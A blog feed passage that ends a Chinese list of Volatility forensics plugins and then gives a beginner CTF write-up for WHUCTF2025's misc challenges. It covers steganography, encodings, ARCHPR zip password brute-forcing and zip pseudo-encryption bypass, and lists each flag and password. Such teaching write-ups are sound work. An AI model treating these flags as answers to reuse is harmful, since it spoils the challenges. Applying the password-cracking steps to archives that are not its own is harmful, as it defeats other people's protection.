将可寻址内存页转储到文件中<br>mac_moddump                - 将指定的内核扩展写入磁盘<br>mac_mount                  - 打印挂载的设备信息<br>mac_netstat                - 列出每个进程的活动网络连接<br>mac_network_conns          - 列出来自内核网络结构的网络连接<br>mac_notesapp               - 查找 Notes 消息的内容<br>mac_notifiers              - 检测将钩子添加到 I&#x2F;O 工具包中的 rootkit（例如 LogKext）<br>mac_orphan_threads         - 列出不映射回已知模块&#x2F;进程的线程<br>mac_pgrp_hash_table        - 遍历进程组哈希表<br>mac_pid_hash_table         - 遍历 pid 哈希表<br>mac_print_boot_cmdline     - 打印内核启动参数<br>mac_proc_maps              - 获取进程的内存映射<br>mac_procdump               - 转储进程的可执行文件<br>mac_psaux                  - 在用户区打印带有参数的进程 (**argv)<br>mac_psenv                  - 在用户空间打印带有环境的进程 (**envp)<br>mac_pslist                 - 列出正在运行的进程<br>mac_pstree                 - 显示进程的父&#x2F;子关系<br>mac_psxview                - 使用各种进程列表查找隐藏进程<br>mac_recover_filesystem     - 恢复缓存的文件系统<br>mac_route                  - 打印路由表<br>mac_socket_filters         - 报告套接字过滤器<br>mac_strings                - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）<br>mac_tasks                  - 列出活动任务<br>mac_threads                - 列出进程线程<br>mac_threads_simple         - 列出线程及其开始时间和优先级<br>mac_timers                 - 报告内核驱动程序设置的定时器<br>mac_trustedbsd             - 列出恶意的trustedbsd 策略<br>mac_version                - 打印 Mac 版本<br>mac_vfsevents              - 列出过滤文件系统事件的进程<br>mac_volshell               - 内存映像中的外壳<br>mac_yarascan               - 扫描内存中的 yara 签名<br>machoinfo                  - 转储 Mach-O 文件格式信息<br>malfind                    - 查找隐藏和注入的代码<br>mbrparser                  - 扫描并解析潜在的主引导记录 (MBR)<br>memdump                    - 转储进程的可寻址内存<br>memmap                     - 打印内存映射<br>messagehooks               - 列出桌面和线程窗口消息挂钩<br>mftparser                  - 扫描并解析潜在的 MFT 条目<br>moddump                    - 将内核驱动程序转储到可执行文件示例<br>modscan                    - 内核模块的池扫描器<br>modules                    - 打印加载模块的列表<br>multiscan                  - 一次扫描各种对象<br>mutantscan                 - 互斥对象的池扫描器<br>netscan                    - 扫描 Vista（或更高版本）图像的连接和套接字<br>notepad                    - 列出当前显示的记事本文本<br>objtypescan                - 扫描 Windows 对象类型对象<br>patcher                    - 基于页面扫描修补内存<br>poolpeek                   - 可配置的池扫描器插件<br>pooltracker                - 显示池标签使用的摘要<br>printkey                   - 打印注册表项及其子项和值<br>privs                      - 显示进程权限<br>procdump                   - 将进程转储到可执行文件示例<br>pslist                     - 按照 EPROCESS 列表打印所有正在运行的进程<br>psscan                     - 进程对象的池扫描器<br>pstree                     - 将进程列表打印为树<br>psxview                    - 使用各种进程列表查找隐藏进程<br>qemuinfo                   - 转储 Qemu 信息<br>raw2dmp                    - 将物理内存样本转换为 windbg 故障转储<br>screenshot                 - 保存基于 GDI 窗口的伪截图<br>servicediff                - 列出 Windows 服务（ala Plugx）<br>sessions                   - 列出 _MM_SESSION_SPACE 的详细信息（用户登录会话）<br>shellbags                  - 打印 ShellBags 信息<br>shimcache                  - 解析应用程序兼容性 Shim Cache 注册表项<br>shutdowntime               - 从注册表打印机器的 ShutdownTime<br>sockets                    - 打印打开的套接字列表<br>sockscan                   - tcp 套接字对象的池扫描器<br>ssdt                       - 显示 SSDT 条目<br>strings                    - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）<br>svcscan                    - 扫描 Windows 服务<br>symlinkscan                - 符号链接对象的池扫描器<br>thrdscan                   - 线程对象的池扫描器<br>threads                    - 调查 _ETHREAD 和 _KTHREADs<br>timeliner                  - 从内存中的各种工件创建时间线<br>timers                     - 打印内核定时器和相关的模块 DPC<br>truecryptmaster            - 恢复 TrueCrypt 7.1a 主密钥<br>truecryptpassphrase        - TrueCrypt 缓存密码短语查找器<br>truecryptsummary           - TrueCrypt 总结<br>unloadedmodules            - 打印已卸载模块的列表<br>userassist                 - 打印 userassist 注册表项和信息<br>userhandles                - 转储 USER 句柄表<br>vaddump                    - 将 vad 部分转储到文件中<br>vadinfo                    - 转储 VAD 信息<br>vadtree                    - 遍历 VAD 树并以树格式显示<br>vadwalk                    - 走 VAD 树<br>vboxinfo                   - 转储 virtualbox 信息<br>verinfo                    - 从 PE 图像中打印出版本信息<br>vmwareinfo                 - 转储 VMware VMSS&#x2F;VMSN 信息<br>volshell                   - 内存映像中的 Shell<br>win10cookie                - 查找 Windows 10 的 ObHeaderCookie 值<br>windows                    - 打印桌面窗口（详细信息）<br>wintree                    - 打印Z顺序桌面Windows树<br>wndscan                    - 用于窗口站的池扫描仪<br>yarascan                   - 使用 Yara 签名扫描进程或内核内存</p><h2 id="Scanner-Checks"><a href="#Scanner-Checks" class="headerlink" title="Scanner Checks"></a>Scanner Checks</h2><p>CheckPoolSize          - 检查池块大小<br>CheckPoolType          - 检查池类型<br>KPCRScannerCheck       - 检查自引用指针以查找KPCR<br>MultiPrefixFinderCheck - 每页检查多个字符串，在偏移处完成<br>MultiStringFinderCheck - 每页检查多个字符串<br>PoolTagCheck           - 此扫描程序检查池标记的出现</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WHUCTF2025迎新赛</title>
    <link href="/2025/08/24/ctf/wp/2025/WHUCTF2025%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <url>/2025/08/24/ctf/wp/2025/WHUCTF2025%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><hr><p>出题：sishijiu&amp;Ikalovic&amp;rhzhrzhr</p><p>个人认为前期除了osint之外最最最简单的一个方向</p><p>题目都不难 以引导各位装工具和自由探索网络环境为主</p><hr><h2 id="misc0-ezsignin"><a href="#misc0-ezsignin" class="headerlink" title="misc0-ezsignin"></a>misc0-ezsignin</h2><p><img src="/images/pasted-0.png" alt="ezsignin"></p><p>点击“进入比赛”前下拉</p><p>WHUCTF{the_v3ry_beginning_flag}</p><hr><h2 id="misc1-ezpng"><a href="#misc1-ezpng" class="headerlink" title="misc1-ezpng"></a>misc1-ezpng</h2><p>给了一个文件头.png的附件 搜索发现png是一种图片类型 双击发现无法查看</p><p>提示用winhex或010editor 搜索发现这两个都是十六进制编辑器 选择一个进行安装</p><p>这里用winhex打开文件头.png</p><p><img src="/_post/ctf/wp/2025/WHUCTF2025%E8%BF%8E%E6%96%B0%E8%B5%9B/3.png" alt="ezsignin"></p><p>发现文件头十六进制信息是<code>50 4B 03 04</code> 对应右边ascii为<code>PK</code> 同时右下角ascii发现了一个<code>flag.txt</code>的字样</p><p>搜索文件头、PK等信息发现这是zip文件的文件头，但后缀名是png的后缀名</p><p>思路为更改后缀名为.zip 那么问题来了有些同学电脑是新的 不知道怎么显示后缀名：</p><p><a href="https://zhuanlan.zhihu.com/p/637215545">https://zhuanlan.zhihu.com/p/637215545</a></p><p>能看到后缀名之后，右键文件重命名，把.png修改为.zip，回车，出现弹窗点击“是”</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YjA5NzUxY2YxMDIyY2Q1NzMwZmUwNmVjMDllYmZmYWZfWnM3cTRyY1JrNTVPUEk3T0hvUVdZN1VjUjBzazdBMkVfVG9rZW46VGtUZGJQNHU2bzNId3h4NVpGQ2N0SkxCbjUyXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>解压文件头.zip(PS:解压缩软件推荐Bandzip）</p><p>进入解压之后的文件夹 打开flag.txt</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTljMDE1MzAyMTgyOWU4ZjQ5NjQ4NTI1YThlMzIwNzJfbXF5OTNubDZ6UVh5U00ydDgzdTA4VDBXRUZoNUs3QlJfVG9rZW46R28wU2JESnp0b3dwcEZ4dnFCb2N4QTFPbnBiXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>WHUCTF{n0w_y0u_s33_my_he4d}</p><hr><h2 id="misc2-依旧老色批"><a href="#misc2-依旧老色批" class="headerlink" title="misc2-依旧老色批"></a>misc2-依旧老色批</h2><p>题目给了两个附件 一个hint.txt和一个rgb.png 提示给了lsb</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YjI0N2IxNjVlNmUxYzY4MGVjMDcxNjgwODBiYzkxY2RfVm1TY3Z4RmhFdzNiTmhpOXFNc0ZmblZQRkRTQnpOTkJfVG9rZW46QXJDMGIwVXNKb0pHc0R4M3REUWNMYzhjbmVoXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>搜索lsb 发现相关知识 但好像没什么用 也没有什么txt中提到的jar相关的内容</p><p>按照txt提到的exif 搜索exif信息 发现在图片属性中能看 右键png打开属性查看 发现备注里有一句话：<strong>stegsolve太好用了你们知道吗</strong></p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MjVhYzUwNmJjODU1YzBjNmVhODkwYWIzZWRkNGUzMDFfNjVGTWUyUU9sbWdycG9XeXVQeGxKSm9nd2lUWUlRYmZfVG9rZW46Q2xJV2JKUWJXbzZXeU54cVpxSWNuOHlkbkpiXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>搜索stegsolve 发现是一个lsb工具 查询相关教程下载安装（这边要装一个jdk，推荐jdk8版本，相对最兼容）</p><p>打开png文件</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MGE2Yzg4MmIxOWE2NTA2NjAyM2E3N2ExYmY0MWE4ZWVfY2VvVWd1VEpDaDRxcUpvdzQxaWV3eHp6emQwR0hkTjdfVG9rZW46R0pYUmJxSUtsbzBlaUF4UGd1dmNWM3VYbkdnXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>那有些小朋友发现还是不会做 怎么办 想起来sishijiu说过的要多搜索 于是打开搜索引擎搜索“ctf misc lsb stegsolve”找到一堆相关教程和题解</p><blockquote><p>发现要用到analyse的dataextract 打开勾选red、green、blue三个通道，选择lsbfirst</p><p>点击preview 向上就能翻找到flag了</p></blockquote><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NzUzNzA2OGE0YWVhYzY0NzdkM2I0ZjE5YTI3MTczMmNfMk9vdzRiS3l4MHhMRE5oM0cxSHNqR0hCd1NJTlAwam9fVG9rZW46TWlXWmJWZ0VZb1U1OUF4OWViSGNlMW1ubjRmXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>WHUCTF{lsb_1s_just_th3_st4rt}</p><hr><h2 id="misc3-1-splitbase"><a href="#misc3-1-splitbase" class="headerlink" title="misc3-1-splitbase"></a>misc3-1-splitbase</h2><p>下载压缩包解压后得到一张gif动图</p><p>打开观察发现有一帧是二维码</p><p>使用<a href="http://1o1o.xyz/">随波逐流</a>gif拆帧工具拆开gif得到二维码（其实速度不高，直接手机对着gif也能扫出来，嘿嘿）</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NDgzNmY1YmRmYmYwZGIyMjJhNDZmNGUzMmRkNDk0ZThfdzlCTFA1VmxYOGJTU1BldjBKM2NYSkNJeHNnZXhMSmhfVG9rZW46QVlwbGJ1UzV2b3lLVjh4Q1RUbGNMNGR4bjZjXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>扫描二维码，得到如下字符串</p><p><code>V0hVQ1RGe3MzM2tfMW50MF90aDNfYmwxbmt9</code></p><p>大小写字母数字均有，尝试base64解码</p><p>WHUCTF{s33k_1nt0_th3_bl1nk}</p><hr><h2 id="misc3-2-ezzip"><a href="#misc3-2-ezzip" class="headerlink" title="misc3-2-ezzip"></a>misc3-2-ezzip</h2><p>给了一个压缩包 发现有密码保护，题目中提示“archpr”和“密码长度为6，包含数字和小写字母”</p><p>搜索<a href="https://www.gndown.com/4185.html">archpr</a>发现是个爆破软件 下载安装 打开zip 把密码长度和范围设置好 点击开始爆破</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NWVlYWY2ZTkzMmI5Y2QwM2QyODkzYWU3NGE3MjE4ZWZfVzBqdEZla3JDMHBHMDI5aXM2a3d0Zk5CVmdaNFB4dTVfVG9rZW46VTAyQ2Iyd25Wb1NMWkN4dk9yS2NicG92bk1mXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YmM3ZWEwZGRjZWEzNDM3ZDBkZmY1YjgwNmQxMTVmZjhfMVJ5Znc5d2xqbjVZSEt3RkpCQU9OaEIxVUtNSEFZRDNfVG9rZW46UjlBTGJFcjhsbzEybEt4OWtiSmM4ZUxybmZlXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>密码：8abc64</p><p>解压得到八卦.txt</p><p><code>☱☲☷☱☱☰☱☲☵☱☰☳☱☲☴☱☰☶☱☷☳☱☴☱☱☵☵☰☶☱☱☵☶☱☶☵☰☶☰☱☶☳☰☶☱☰☴☱☱☳☷☱☷☲☱☵☱☱☶☰☱☳☷☱☴☶☱☵☴☱☷☱☱☷☵</code></p><p>使用随波逐流中的八卦解密工具：WHUCTF{am1nu0s1!_zip_fly}</p><hr><h2 id="misc4-BlindWaterMark"><a href="#misc4-BlindWaterMark" class="headerlink" title="misc4-BlindWaterMark"></a>misc4-BlindWaterMark</h2><p>下载压缩包解压，打开文件夹发现两张外表一致的图片</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OWM5NGIwMjNhZTBlNWY3ZDA4NGRkMGEzOGRkZThmMGZfamNHc0Q2RDdVRWFrMWhQU1RPNnB1bmExM1dqeUl2em1fVG9rZW46UjExcGJCVFJwb1hXekl4R1RXc2M5SzBrblJnXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>回看题名，题为BlindWaterMark，搜索发现有一个<a href="https://github.com/chishaxie/BlindWaterMark">github</a>项目就叫这个，这两张图片运用了盲水印的技术</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTI0ZGJkMWVjMTI5NjNjODhlMWU3MWE4ZTg0MzkxMzhfVWRLaVdMN0Q1eWpvZjZrRTBDSHVUTmd4OVFPakM0WGZfVG9rZW46WEJ4ZmJldTA0b3J6dUl4cDdYTGNucjNnbkZoXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MDBlZGIxZGI2YTQzZGQ5ZmUzMDQwYWY3NmY1OWUxZjBfUmhKbnNHYklscVBtaU03U1dBcjBPOHlEOWdMU2ZLcjZfVG9rZW46VHRmRmJBRWlqb25KYnN4ZGJDSWNhN2FWbnVnXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>下载后根据文件指示对题目的两张图片做处理</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFhMzNkMGQxOWYzZjU5YzU0OGIxODdlMWNhMWFlOWRfbTVFcVhldGdWUTdhdG5EU2FtVU9DWUR5SmN2ZnFCdTdfVG9rZW46WEJremJ5bzVwb0pVWTJ4SkNPOGNPcGpZbmRlXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>WHUCTF{BWM_IS_GOOD}</p><hr><h2 id="misc5-1-年轮"><a href="#misc5-1-年轮" class="headerlink" title="misc5-1-年轮"></a>misc5-1-年轮</h2><p>下载压缩包，解压后发现文件夹套娃文件夹，尝试写出脚本提取最里层的文件</p><p>AI写出的代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs Plain">import os<br>import shutil<br>SOURCE_DIRECTORY = &quot;&quot;  # 源目录路径<br>TARGET_DIRECTORY = &quot;&quot;  # 输出目录路径<br>ORGANIZE_BY_TYPE = True     # 是否按文件类型组织<br>OVERWRITE_EXISTING = False  # 是否覆盖同名文件<br>  <br>def extract_files(source_dir, target_dir, organize_by_type, overwrite):<br>    if not os.path.exists(target_dir):<br>        os.makedirs(target_dir)<br>    for root, dirs, files in os.walk(source_dir):<br>        for file in files:<br>            source_path = os.path.join(root, file)<br>            if organize_by_type:<br>                _, ext = os.path.splitext(file)<br>                ext = ext[1:] if ext else &quot;no_extension&quot;<br>                type_dir = os.path.join(target_dir, ext.lower())<br>                if not os.path.exists(type_dir):<br>                    os.makedirs(type_dir)<br>                dest_path = os.path.join(type_dir, file)<br>            else:<br>                dest_path = os.path.join(target_dir, file)<br>            if not overwrite and os.path.exists(dest_path):<br>                base, extension = os.path.splitext(file)<br>                counter = 1<br>                while os.path.exists(dest_path):<br>                    new_name = f&quot;&#123;base&#125;_&#123;counter&#125;&#123;extension&#125;&quot;<br>                    dest_path = os.path.join(os.path.dirname(dest_path), new_name)<br>                    counter += 1<br>            shutil.copy2(source_path, dest_path)<br>  <br>if __name__ == &quot;__main__&quot;:<br><br>    extract_files(SOURCE_DIRECTORY, TARGET_DIRECTORY, ORGANIZE_BY_TYPE, OVERWRITE_EXISTING)<br></code></pre></td></tr></table></figure><p>当然这道题也可以直接用bandzip不解压打开压缩包一路狂点qwq</p><p>WHUCTF{taO_wa_1s_fun}</p><hr><h2 id="misc5-2-Ook"><a href="#misc5-2-Ook" class="headerlink" title="misc5-2-Ook?"></a>misc5-2-Ook?</h2><p>下载压缩包，发现有密码，题目中有密文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.<br></code></pre></td></tr></table></figure><p>搜索发现一种加解密Ook</p><p>使用<a href="https://www.splitbrain.org/services/ook">Ook</a>解密得到文本：<code>nizaikankannidehoumianne</code></p><p>用该文本解密压缩包得到flag.txt，出现了一个<code>fake_flag</code>,长得很奇怪的样子</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDRkMmJkNjIxZTcxM2MwYjUzYzQzODRkOTZlMTViMGFfVVJhYzdVRnY5NUcxVGMwT2Vqc005ZEtScWw1d2hwREZfVG9rZW46WWl6SGJsWjBhb2JnVHh4Z2cwZmNQRU9wbkZlXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>该文本中共有497字符，尝试<a href="http://www.sexy0769.com/zeroWidthEncode/index.jsp">零宽字符解密</a></p><p>解密得到：<code>congratulations！WHUCTF&#123;k3y_1n_o_4nd_0!&#125; key:sh4rk_0n_w1r3:)</code></p><p>key为题目ezpcap的压缩包密码</p><p>WHUCTF{k3y_1n_o_4nd_0!}</p><hr><h2 id="misc6-密码在哪里"><a href="#misc6-密码在哪里" class="headerlink" title="misc6-密码在哪里"></a>misc6-密码在哪里</h2><p>下载压缩包，发现有密码，题目并未给特定的提示信息，根据文件名用winhex寻找密码</p><p>在文件尾部发现信息<code>iloveu#</code> 为压缩包密码 解压得到图片</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MTUwMThjZDhmNjRlMjlhNWI1Y2FlOTU2YzJlZjI0MDlfZ3BLY2FxdjQyWjZUTWVKN1NCc0l3NE5yNW0yVnBtU0pfVG9rZW46TkJabGJyUlFzb0hoWXF4RWxHcmNsNVdlbmZiXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><blockquote><p>按照文件名使用foremost分离文件</p><p>得到jpg文件和zip文件</p><p>检查jpg文件的16进制发现<code>key:kafuchino</code></p><p>用kafuchino解密压缩包，得到被裁减的答案.png</p></blockquote><p>检测文件的CRC值发现其尺寸有问题，修正尺寸为86×1704后得到完整密文</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NjA4NTJiMWE4YTljMjgyYjNhMmM1MGVmYjEwMjk0M2ZfMlJRSTR0c3VZNlZVdzRmSHpERktSS0V6UGV6Zmh4QXVfVG9rZW46TG4zWmJsODJmb3Z5Z1Z4MWZ1cWM2bG8zbk9kXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>摩斯密码解密</p><p>WHUCTF{MISC_IS_SO_FUNNY}</p><hr><h2 id="misc7-snowpork"><a href="#misc7-snowpork" class="headerlink" title="misc7-snowpork"></a>misc7-snowpork</h2><p>打开压缩包发现分为1.2.3三部分，按顺序来解</p><p>1.雪一片一片一片一片</p><p>打开有bacon和snowpork两个txt文件</p><p>bacon中有一串只由A和B构成的字符串，用培根密码将其解密，得到字符<code>passwordsnow</code></p><p>snowpork中第一行韩文后和最后一行韩文结束有一些不可见字符(空格，tab与换行符)，搜索发现为snow隐写，密钥很可能是bacon中得到的”snow”</p><p>用snow隐写工具输入密钥snow，解密得到文本<code>emojikey:pighuh</code></p><p>2.变脸这一块</p><p>打开是一串emoji符号，由上一步得到的密钥说明是emoji相关加解密，搜了几个emoji，最后使用<a href="https://emoji-aes.miaotony.xyz/">emojiaes</a>解密得到字符<code>xiangsifengzhongkai</code></p><p>以此为密码解开3.pig压缩包</p><p>3.pig</p><p>压缩包内部为一张图片</p><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NWM4ZmQ1ZDJiN2EwMDczZTk0ODgwNmY1NjMyOWUyZDJfNEdhQ3lsWFFXeG9CcTVBcWRBd0JPa2czVmc1UGU4NXFfVG9rZW46VmM1RmI5VXkzb0lZOEF4NXFUVGM1SXk3blBiXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>猪圈密码 找个在线解密器手动对照输入一下</p><p>whuctf{ni_ruo_san_dong_lai}</p><hr><h2 id="misc8-boss直聘"><a href="#misc8-boss直聘" class="headerlink" title="misc8-boss直聘"></a>misc8-boss直聘</h2><p>打开压缩包，里面有3个文件，唯一的压缩包有密码，明显要从另外两个文件寻找密码</p><ol><li><p>盲，盲点好啊.docx(喜欢乱翻的话该步可能能跳过)</p></li><li><p>用word打开后内部并无有用内容，可能是隐藏在段落符号之间，将后缀名改为zip解压，检查document.xml文件，在行2，列3091处发现盲文<code>⠗⠑⠙⠸⠏⠇⠁⠝⠑⠸⠴</code>，翻译后是<code>red_plane_0</code>，指向png文件的red plane图层</p></li><li><p>真正想赢的人.png</p></li><li><p>用stegsolve打开文件翻到red plane 0图层发现一个码</p></li></ol><p><img src="https://whuctf-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NzZjZTljNDFlMDlhNWFjZWJiYjgxY2M3YzlmMzVlNjRfNU4yNUQ0eTBLaGRxckNPVGFxOUxpVFRsY0p1cmJoQm9fVG9rZW46VGZJbGJVM0RhbzA2WHJ4eG82bGMwMTVWbmZmXzE3NTYwMzU3Njk6MTc1NjAzOTM2OV9WNA"></p><p>搜索发现是汉信码，找个汉信码在线扫描器得到压缩包密码<code>m3ng_lei</code></p><ol start="3"><li><p>你甚至不能擦伤我.zip</p></li><li><p>打开zip发现又有三个文件，两个zip似乎都有密码，先解图片</p></li><li><ol><li>哼啊啊啊啊.png</li></ol></li><li><p>打开发现是残缺的二维码，使用补全工具补全二维码，扫描进入兽音译者网站</p></li><li><p>winhex打开中发现文件末尾有一串字符<code>5a+G5paH55qE5a+G6ZKl77ya5ZO85ZWK77yBfg==</code></p></li><li><p>base64解码得到：<code>密文的密钥：哼啊！~</code></p></li><li><p>将其预先填入兽音译者网站的编码字符一栏备用</p></li><li><ol start="2"><li>随便你爆破，量子计算机也爆破不开.zip</li></ol></li><li><p>由文件名想到zip伪加密，打开16进制编辑器发现数据区的8，9位为08 00，中央目录区的8，9位为09 03，属于伪加密，将中央目录区的09 03改为00 00，保存后成功解密得到密文.txt</p></li><li><p>将密文输入兽音译者得到压缩包密码：<code>key1:114514@#awa</code></p></li><li><ol start="3"><li>last.zip</li></ol></li><li><p>解开压缩包后得到peano.jpg，文件名即为加密方式：peano分形，搜索ctf peano，<a href="https://almostgph.github.io/2024/01/08/IrisCTF2024/#the-peano-scramble">在网上找到复原脚本</a></p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 